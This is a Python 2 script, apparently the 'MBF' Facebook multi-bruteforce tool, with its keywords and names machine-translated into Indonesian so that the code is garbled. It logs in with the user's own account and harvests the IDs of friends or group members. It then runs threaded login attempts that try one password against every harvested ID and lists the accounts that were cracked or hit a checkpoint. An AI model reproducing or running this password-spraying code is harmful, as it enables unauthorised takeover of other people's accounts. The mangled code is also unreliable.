platform impor , os , sys
def  cetak ( x , e = 0 ):
	w  =  'mhkbpcP'
	untuk  saya  di  w :
		j  =  w . indeks ( i )
		x =  x . ganti ( '!% s' % i , ' \ 033 [% s; 1m' % str ( 31 + j ))
	x  + =  ' \ 033 [0m'
	x  =  x . ganti ( '! 0' , ' \ 033 [0m' )
	jika  e  ! =  0 :
		sys . stdout . tulis ( x )
	lain :
		sys . stdout . tulis ( x + ' \ n ' )
jika  platform . python_version (). split ( '.' ) [ 0 ] ! =  '2' :
	cetak ( '! m [!] Kamu menggunakan python versi% s silahkan menggunakan versi 2.x.x' % v (). split ( '' ) [ 0 ])
	sys . keluar ()
impor  cookielib , re , urllib2 , urllib , threading
coba :
  impor  mekanik
kecuali  ImportError :
	cetak ( '! m [!] SepertiNya Module! cmechanize! m belum di install ... \ n ! h [!] pip2 install mechanize' )
	sys . keluar ()
br  =  0
log  =  0
id_bteman  = []
id_bgroup  = []
fid_bteman  = []
fid_bgroup  = []
class  mt ( threading . Thread ):
	def  __init__ ( diri , i , p ):
		threading . Benang . __init__ ( sendiri )
		diri . id  =  i
		diri . a  =  0
		diri . p  =  p
	 pembaruan def ( sendiri ):
		kembali  sendiri . a , diri . Indo
	def  run ( self ):
		coba :
			data  =  urllib2 . urlopen ( urllib2 . Request ( url = 'https://m.facebook.com/login.php' , data = urllib . urlencode ({ 'email' : self . id , 'pass' : self . p }), header = { 'User-Agent' : 'Opera / 9.80 (Android; Opera Mini / 32.0.2254 / 85. U; id) Presto / 2.12.423 Version / 12.16' }))
		kecuali  KeyboardInterrupt :
			sys . keluar ()
		kecuali :
			diri . a  =  4
			sys . keluar ()
		jika  'm_sess'  dalam  data . url  atau  'save-device'  dalam  data . url :
			diri . a  =  1
		elif  'pos pemeriksaan'  dalam  data . url :
			diri . a  =  2
		lain :
			diri . a  =  3
def  retak ( d ):
	sedangkan  1 :
		s  =  inputD ( '[?] Sandi' )
		jika  len ( s ) <  6 :
			cetak ( '! m [!] Jumlah huruf minimal! k6' )
		lain :
			istirahat
	kembali  crack0 ( d , s )
def  tampilhasil ( akun , sandi , Data ):
	cekpoint  = []
	salah  =  0
	berhasil  = []
	untuk  saya  di  akun :
		st , id  =  i
		jika  st  ==  1 :
			berhasil . tambahkan ( id )
		elif  st  ==  2 :
			cekpoint . tambahkan ( id )
		elif  st  ==  3 :
			salah  + =  1
	cetak ( '! h [*] Berhasil! c% d' % len ( berhasil ))
	jika  len ( berhasil ) ! =  0 :
		untuk  i  di  BERHASIL :
			cetak ( '! h ###! p% s! m =>! b [! k% s! b]' % ( i , sandi ))
	cetak ( '! k [*] Cekpoint! c% d' % len ( cekpoint ))
	jika  len ( cekpoint ) ! =  0 :
		untuk  saya  di  cekpoint :
			cetak ( '! k ###! p% s! m =>! b [! k% s! b]' % ( i , sandi ))
	cetak ( '! m [*] Gagal! c' + str ( salah ))
	i  =  inputD ( '[?] Tidak Puas dengan Hasil, Mau coba lagi (y / t)' , [ 'Y' , 'T' ])
	jika  saya . atas () ==  'Y' :
		 retakan kembali ( data )
	lain :
		 menu kembali ()
def  crack0 ( data , sandi ):
	akun  = []
	cetak ( '! h [*] MengCrack! k% d Akun! hdengan sandi! m [! k% s! m]' % ( len ( data ), sandi ))
	cetak ( '! h [*] Cracking! k0! m%' , 1 )
	sys . stdout . flush ()
	jml0 , jml1  =  0 , 0
	th  = []
	untuk  saya  dalam  data :
		i  =  i . ganti ( '' , '' )
		i  =  i . ganti ( ' \ n ' , '' )
		jika  len ( i ) ! =  0 : th . tambahkan ( mt ( i , sandi ))
		jml1  + =  1
	untuk  saya  di  th :
		i . daemon  =  Benar
		coba : i . mulai ()
		kecuali  KeyboardInterrupt : exit ()
	h_error  = []
	error  =  0
	sedangkan  1 :
		coba :
			untuk  saya  di  th :
				status , id  =  i . perbarui ()
				jika  status  ! =  0 :
					cetak ( ' \ r ! h [*] Cracking! k% d! m% s! 0' % ( int ( float (( float ( jml0 ) / float ( jml1 )) * 100 )), '%' ), 1 )
					sys . stdout . flush ()
					del ( th [ th . index ( i )])
					jika  status  ==  4 :
						h_error . tambahkan ( id )
						jika  h_error . hitungan ( id ) ==  3 :
							lulus
						lain :
							th . tambahkan ( mt ( id , sandi ))
							th [ len ( th ) - 1 ]. daemon  =  Benar
							th [ len ( th ) - 1 ]. mulai ()
					lain :
						jml0  + =  1
						akun . tambahkan (( status , id ))
		kecuali  KeyboardInterrupt :
			sys . keluar ()
		coba :
			jika  threading . activeCount () ==  1 : istirahat
		kecuali  KeyboardInterrupt :
			keluar ()
	cetak ( ' \ r ! h [*] Cracking! k100! m%' )
	tampilhasil ( akun , sandi , Data )
def  install_browser ():
	 br global
	br  =  mekanik . Peramban ()
	br . set_handle_robots ( Salah )
	br . set_handle_equiv ( Benar )
	br . set_handle_referer ( Benar )
	br . set_cookiejar ( cookielib . LWPCookieJar ())
	br . set_handle_redirect ( Benar )
	br . set_handle_refresh ( mekanisasi . _http . HTTPRefreshProcessor (), max_time = 1 )
	br . addheaders  = [( 'User-Agent' , 'Opera / 9.80 (Android; Opera Mini / 32.0.2254 / 85. U; id) Presto / 2.12.423 Version / 12.16' )]
def  bacaData ():
	global  fid_bgroup , fid_bteman
	coba :
		fid_bgroup  =  buka ( os . sys . path [ 0 ] + '/MBFgroup.txt' , 'r' ). garis baca ()
	kecuali : lulus
	mencoba :
		fid_bteman  =  buka ( os . sys . path [ 0 ] + '/MBFteman.txt' , 'r' ).garis baca ()
	kecuali : lulus
def  simpan ():
	jika  len ( id_bgroup ) ! =  0 :
		cetak ( '! h [*] Menyimpan hasil dari Group' )
		mencoba :
			buka ( os . sys . path [ 0 ] + '/MBFgroup.txt' , 'w' ). tulis ( ' \ n ' . gabung ( id_bgroup ))
			cetak ( '! h [!] Berhasil meyimpan! cMBFgroup.txt' )
		kecuali :
			cetak ('! m [!] Gagal meyimpan' )
	jika  len ( id_bteman ) ! =  0 :
		cetak ( '! h [*] Menyimpan hasil daftar Teman ...' )
		coba :
			buka ( os . sys . path [ 0 ] + '/MBFteman.txt' , 'w' ). tulis ( ' \ n ' . gabung ( id_bteman ))
			cetak ( '! h [!] Berhasil meyimpan! cMBFteman.txt' )
		kecuali :
			cetak ( '! m [!] Gagal meyimpan' )
def  Keluar ():
	simpan ()
	cetak ( '! m [!] Keluar' )
	sys . keluar ()
def  inputD ( x , v = 0 ):
	sementara  1 :
		mencoba :
			a  =  masukan_maka ( ' \ x1b [32; 1m% s \ x1b [31; 1m: \ x1b [33; 1m' % x )
		kecuali :
			cetak ( ' \ n ! m [!] Batal' )
			keluar ()
		jika  v :
			jika  a . atas () di  v :
				istirahat
			lain :
				cetak ( '! m [!] Masukan Opsinya Bro ...' )
				terus
		lain :
			jika  len ( a ) ==  0 :
				cetak ( '! m [!] Masukan dengan benar' )
				terus
			lain :
				istirahat
	kembali  a
def  inputM ( x , d ):
	sedangkan  1 :
		coba :
			i  =  int ( inputD ( x ))
		kecuali :
			cetak ( '! m [!] Pilihan tidak ada' )
			terus
		jika  saya  dalam  d :
			istirahat
		lain :
			cetak ( '! m [!] Pilihan tidak ada' )
	kembali  saya
def  lanjutG ():
	 fid_bgroup global
	jika  len ( fid_bgroup ) ! =  0 :
		i  =  inputD ( '[?] Riset Hasil Grup Id / kereta (r / l)' , [ 'R' , 'L' ])
		jika  saya . atas () ==  'L' :
			 retakan kembali ( fid_bgroup )
		lain :
			os . hapus ( os . sys . path [ 0 ] + '/MBFgroup.txt' )
			fid_bgroup  = []
	return  0
def  lanjutT ():
	 fid_bteman global
	jika  len ( fid_bteman ) ! =  0 :
		i  =  inputD ( '[?] Riset Hasil Id Teman / kereta (r / l)' , [ 'R' , 'L' ])
		jika  saya . atas () ==  'L' :
			 retakan kembali ( fid_bteman )
		lain :
			os . hapus ( os . sys . path [ 0 ] + '/MBFteman.txt' )
			fid_bteman  = []
	return  0
def  buka ( d ):
	coba :
		x  =  br . terbuka ( d )
		br . _factory . is_html  =  Benar
		x  =  x . baca ()
	kecuali :
		cetak ( ' \ r ! m [!] Gagal membuka! p' + str ( d ))
		keluar ()
	jika  '<link rel = "redirect" href = "'  di  x :
		return  buka ( br . find_link (). url )
	lain :
		kembali  x
def  login ():
	 log global
	us  =  inputD ( '[?] Email / HP' )
	pa  =  inputD ( '[?] Kata Sandi' )
	cetak ( '! h [*] Sedang Login ....' )
	buka ( 'https://m.facebook.com' )
	br . select_form ( nr = 0 )
	br . formulir [ 'email' ] = kami
	br . bentuk [ 'lulus' ] = pa
	br . kirim ()
	url  =  br . geturl ()
	jika  'save-device'  di  url  atau  'm_sess'  di  url :
		buka ( 'https://mobile.facebook.com/home.php' )
		nama  =  br . find_link ( url_regex = 'logout.php' ). teks
		nama  =  re . findall ( r '\ ((. * a?) \)' , nama ) [ 0 ]
		cetak ( '! h [*] Selamat datang! k% s' % nama )
		cetak ( '! h [*] Semoga ini adalah hari keberuntungan mu ...' )
		log  =  1
	elif  'checkpoint'  di  url :
		cetak ( '! m [!] Akun kena checkpoint \ n ! k [!] Coba Login dengan opera mini' )
		keluar ()
	lain :
		cetak ( '! m [!] Masuk Gagal' )
def  idgroup ():
	jika  log  ! =  1 :
		cetak ( '! h [*] Login! bFB! h dulu bos ...' )
		login ()
		jika  log  ==  0 :
			keluar ()
	next  =  saring_id_group0 ()
	sedangkan  1 :
		saring_id_group1 ( buka ( selanjutnya ))
		coba :
			next  =  br . find_link ( url_regex = '/ browse / group / members /' ). url
		kecuali :
			cetak ( '! m [!] Hanya Bisa Berhak! h% d id' % len ( id_bgroup ))
			istirahat
	simpan ()
	i  =  inputD ( '[?] Langsung Crack (y / t)' , [ 'Y' , 'T' ])
	jika  saya . atas () ==  'Y' :
		 retakan kembali ( id_bgroup )
	lain :
		 menu kembali ()
def  saring_id_teman ( r ):
	untuk  i  di  re . findall ( r '/ friends / hovercard / mbasic / \? uid = (. *?) &' , r ):
		id_bteman . tambahkan ( i )
def  idteman ():
	jika  log  ! =  1 :
		cetak ( '! h [*] Login! bFB! hdulu bos ...' )
		login ()
		jika  log  ==  0 :
			keluar ()
	cetak ( '! h [*] Sedang mengumpulkan id teman ...' )
	buka ( 'https://m.facebook.com/friends/center/mbasic/?fb_ref=bm&sr=1&ref_component=mbasic_bookmark&ref_page=XMenuController' )
	JUMLAH  =  br . find_link ( url_regex = '/ friends / center / friends /' ). teks
	JUMLAH  =  re . temukan ( r '\ ((. * a?) \)' , jumlah ) [ 0 ]
	cetak ( '! h [*] minta! p% s! hid teman' % jumlah )
	saring_id_teman ( buka ( 'https://m.facebook.com/friends/center/friends/?fb_ref=fbm&ref_component=mbasic_bookmark&ref_page=XMenuController' ))
	coba :
		next  =  br . find_link ( url_regex = 'friends_center_main' ). url
	kecuali :
		jika  len ( id_teman ) ! =  0 :
			cetak ( '! m [!] Hanya dapat mengambil! p% d id' % len ( id_bteman ))
		lain :
			cetak ( '! m [!] Batal' )
			keluar ()
	sedangkan  1 :
		saring_id_teman ( buka ( selanjutnya ))
		cetak ( ' \ r ! h [*]! p% s! hid terambil ...' % len ( id_bteman ), 1 )
		sys . stdout . flush ()
		coba :
			next  =  br . find_link ( url_regex = 'friends_center_main' ). url
		kecuali :
			cetak ( ' \ n ! m [!] Hanya dapat mengambil! p% d id' % len ( id_bteman ))
			istirahat
	simpan ()
	i  =  inputD ( '[?] Langsung Crack (y / t)' , [ 'Y' , 'T' ])
	jika  saya . atas () ==  'Y' :
		 retakan kembali ( id_bteman )
	lain :
		 menu kembali ()
 menu def ():
	cetak ( " \ n            ! h.-.- .. \ n           / + / ++ // \ n          / + / ++ // \ n   ! k *! k *! h / + / ++ // \ n    \ / | / __ // \ n ! h {! mX! h} v {! mX! h}! 0! b |! cMBF! b | ==========. \ n    ! h ( ! m '! h)! 0! h /' | '\! b \\ \ n        ! h / \ \! b' \ n        ! h \ _ \ _ \ _! k ___! mMBF! c2.0! k ___ \ n \ n ! m *! bMULTI BRUTEFORCE FACEBOOK \ n ! m *! cPIRMANSX ! m *! phttps: //pirmansx.waper.com \ n ! k. =============== =======. \ n |! h AMBIL! mID! h DARI .....! k | \ n \ n ! m *! phttps: //github.com/pirmansx \ n ! m *! phttps: //facebook.com/groups/164201767529837 \ n '======================' \ n ! k #! p1! hDAFTAR TEMAN \ n ! k #! p2! hANGGOTA GROUP \ n ! k #! p3! mKELUAR ... " )
	i  =  inputM ( '[?] PILIH' , [ 1 , 2 , 3 ])
	jika  i  ==  2 :
		lanjutG ()
		idgroup ()
	elif  i  ==  1 :
		lanjutT ()
		idteman ()
	elif  i  ==  3 :
		keluar ()
bacaData()
install_browser()
menu()
#
#
#